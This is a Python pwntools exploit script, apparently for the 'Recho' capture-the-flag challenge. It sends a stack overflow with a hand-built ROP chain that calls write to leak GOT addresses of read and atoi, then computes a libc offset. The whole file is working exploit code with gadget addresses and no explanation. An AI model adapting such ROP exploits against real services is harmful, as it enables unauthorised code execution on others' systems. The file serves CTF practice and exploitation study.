#!/usr/bin/env python
# coding=utf-8

from pwn import *

context.log_level = "debug"
# context.terminal = ['terminator', '-x', 'bash', '-c']
debug = 1
if debug:
    p = remote("127.0.0.1", 10001)
else:
    p = remote("recho.2017.teamrois.cn", 9527)
e = ELF('Recho')
# gdb.attach(p)
padding = 0x38*'a'          #padding
# write(1, got['read'], 8)
payload = ""
payload += p64(0x4008a3)  # pop rdi;ret
payload += p64(1)         # rdi = 1
payload += p64(0x4008a1)  # pop rsi; pop r15; ret
payload += p64(e.got['read'])  # rsi = got.plt read
payload += p64(0)         # r15 = 0
payload += p64(0x4006fe)  # pop rdx;ret
payload += p64(8)         # rdx = 8
payload += p64(e.symbols['write'])  # call write
# write(1, got['write'], 8)
payload += p64(0x4008a3)  # pop rdi;ret
payload += p64(1)         # rdi = 1
payload += p64(0x4008a1)  # pop rsi; pop r15; ret
payload += p64(e.got['atoi'])  # rsi = got.plt atoi
payload += p64(0)         # r15 = 0
payload += p64(0x4006fe)  # pop rdx;ret
payload += p64(8)         # rdx = 8
payload += p64(e.symbols['write'])  # call write


p.readuntil("server!\n")
p.sendline('1000')
p.sendline(padding + payload)
p.recv()
p.sock.shutdown(1)
print u64(p.recv(8)) - u64(p.recv(8))
p.interactive()